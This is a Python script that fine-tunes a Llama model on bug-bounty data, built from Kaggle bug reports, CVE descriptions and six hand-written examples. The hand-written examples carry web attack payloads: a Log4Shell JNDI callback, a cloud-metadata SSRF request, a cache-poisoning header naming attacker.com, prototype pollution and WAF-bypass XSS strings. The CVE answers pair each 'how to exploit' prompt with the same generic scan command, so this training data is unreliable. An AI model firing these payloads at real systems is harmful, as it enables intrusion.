"""
CyberMind Fine-Tuning (Simplified — No Unsloth)
Works on any Colab GPU. Slower but more reliable.
"""

import json, random, subprocess, sys
from pathlib import Path

# Install dependencies
print("[1/5] Installing dependencies...")
for pkg in ["transformers", "datasets", "trl", "accelerate", "bitsandbytes", "peft", "kagglehub", "pandas", "requests"]:
    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])

from datasets import Dataset
from transformers import AutoModelForCausalLM, AutoTokenizer, TrainingArguments, BitsAndBytesConfig
from trl import SFTTrainer
from peft import LoraConfig, get_peft_model
import torch

print("[2/5] Loading model...")

# 4-bit quantization config
bnb_config = BitsAndBytesConfig(
    load_in_4bit=True,
    bnb_4bit_quant_type="nf4",
    bnb_4bit_compute_dtype=torch.float16,
    bnb_4bit_use_double_quant=True,
)

model = AutoModelForCausalLM.from_pretrained(
    "meta-llama/Llama-3.2-3B-Instruct",
    quantization_config=bnb_config,
    device_map="auto",
    trust_remote_code=True,
)
tokenizer = AutoTokenizer.from_pretrained("meta-llama/Llama-3.2-3B-Instruct")
tokenizer.pad_token = tokenizer.eos_token

# LoRA config
lora_config = LoraConfig(
    r=16,
    lora_alpha=16,
    target_modules=["q_proj", "k_proj", "v_proj", "o_proj"],
    lora_dropout=0.05,
    bias="none",
    task_type="CAUSAL_LM",
)
model = get_peft_model(model, lora_config)

print("[3/5] Loading datasets...")

all_entries = []

# Kaggle Bug Hunter
try:
    import kagglehub, pandas as pd
    path = kagglehub.dataset_download("vellyy/bug-hunter")
    for csv_file in Path(path).rglob("*.csv"):
        df = pd.read_csv(csv_file, encoding="utf-8", errors="replace")
        title_col = next((c for c in df.columns if any(k in c.lower() for k in ["title","name"])), None)
        desc_col = next((c for c in df.columns if any(k in c.lower() for k in ["desc","detail","report"])), None)
        if title_col and desc_col:
            for _, row in df.iterrows():
                t, d = str(row.get(title_col,"")).strip(), str(row.get(desc_col,"")).strip()
                if t and d and len(d) > 50:
                    all_entries.append({
                        "instruction": f"Analyze this bug: {t}",
                        "output": f"## {t}\n\n{d[:1000]}\n\n## Exploitation\nnuclei -u https://TARGET -severity critical,high\n\n## Impact\nUnauthorized access or data exposure."
                    })
    print(f"  Kaggle: {len(all_entries)} entries")
except Exception as e:
    print(f"  Kaggle failed: {e}")

# Figshare CVE
try:
    import requests
    api = requests.get("https://api.figshare.com/v2/articles/22056617", timeout=30).json()
    url = api["files"][0]["download_url"]
    print("  Downloading Figshare CVE...")
    cve_data = requests.get(url, timeout=120).json()
    if isinstance(cve_data, dict):
        cve_data = cve_data.get("cves", cve_data.get("vulnerabilities", []))
    before = len(all_entries)
    for cve in cve_data[:2000]:
        cid, desc = cve.get("id",""), cve.get("description","")
        if cid and desc and len(desc) > 30:
            all_entries.append({
                "instruction": f"Explain {cid} and how to exploit it.",
                "output": f"## {cid}\n\n{desc[:600]}\n\n## Detection\nnuclei -u https://TARGET -tags {cid.lower()}\n\n## Impact\nSystem compromise possible."
            })
    print(f"  Figshare: {len(all_entries)-before} entries")
except Exception as e:
    print(f"  Figshare failed: {e}")

# Synthetic
SYNTHETIC = [
    {"instruction": "How to test for price manipulation in e-commerce?", "output": "## Price Manipulation\n\nStep 1: Intercept checkout POST\nStep 2: Change price=-99.99 (negative)\nStep 3: Test price=0 (free)\nStep 4: Race condition: 20 concurrent coupon requests\n\nExpected: Multiple discounts applied = bug"},
    {"instruction": "OAuth missing state parameter test?", "output": "## OAuth CSRF\n\nTest: https://target.com/oauth/authorize?response_type=code&client_id=ID&redirect_uri=https://target.com/callback\n(No state parameter)\n\nVulnerable if: No error\nImpact: Account takeover"},
    {"instruction": "Node.js target, standard tools found nothing. What novel attacks?", "output": "## Novel Attacks\n\n1. Prototype Pollution: ?__proto__[admin]=true\n2. HTTP Smuggling: smuggler.py -u https://target.com\n3. SSRF: POST /webhook {\"url\":\"http://169.254.169.254/\"}\n4. Cache Poisoning: curl -H 'X-Forwarded-Host: attacker.com'"},
    {"instruction": "Explain Log4Shell CVE-2021-44228", "output": "## Log4Shell (CVSS 10.0)\n\nVuln: JNDI injection in Log4j\n\nDetection:\nnuclei -u https://TARGET -tags log4j\ncurl -H 'User-Agent: ${jndi:ldap://YOUR_URL/a}' https://TARGET\n\nIf DNS callback → RCE confirmed\nBounty: $10k-$100k+"},
    {"instruction": "S3 bucket misconfiguration testing?", "output": "## S3 Testing\n\naws s3 ls s3://BUCKET --no-sign-request\ncurl https://BUCKET.s3.amazonaws.com/\ncloud_enum -k COMPANY\n\nImpact: Public S3 = $5k-$50k"},
    {"instruction": "Cloudflare WAF blocking XSS. Bypass techniques?", "output": "## Cloudflare Bypass\n\n1. URL encode: %3Cscript%3E\n2. Case: <ScRiPt>alert(1)</sCrIpT>\n3. Event: <img src=x onerror=alert(1)>\n4. dalfox: --waf-bypass --delay 1000\n5. Headers: -H 'X-Forwarded-For: 127.0.0.1'"},
]
all_entries.extend(SYNTHETIC)
print(f"  Synthetic: {len(SYNTHETIC)} entries")
print(f"\n  TOTAL: {len(all_entries)} training examples")

print("[4/5] Formatting and training...")

# Format dataset
def format_prompt(example):
    return f"### Instruction:\n{example['instruction']}\n\n### Response:\n{example['output']}{tokenizer.eos_token}"

dataset = Dataset.from_list(all_entries)
dataset = dataset.map(lambda x: {"text": format_prompt(x)})

# Train
trainer = SFTTrainer(
    model=model,
    tokenizer=tokenizer,
    train_dataset=dataset,
    dataset_text_field="text",
    max_seq_length=2048,
    args=TrainingArguments(
        output_dir="cybermind_model",
        num_train_epochs=3,
        per_device_train_batch_size=2,
        gradient_accumulation_steps=4,
        learning_rate=2e-4,
        fp16=True,
        logging_steps=10,
        save_strategy="epoch",
        optim="paged_adamw_8bit",
    ),
)

trainer.train()
print("[5/5] Saving model...")

model.save_pretrained("cybermind_lora")
tokenizer.save_pretrained("cybermind_lora")
print("✓ Model saved: cybermind_lora/")
print("\nNEXT: Upload to HuggingFace (see instructions)")
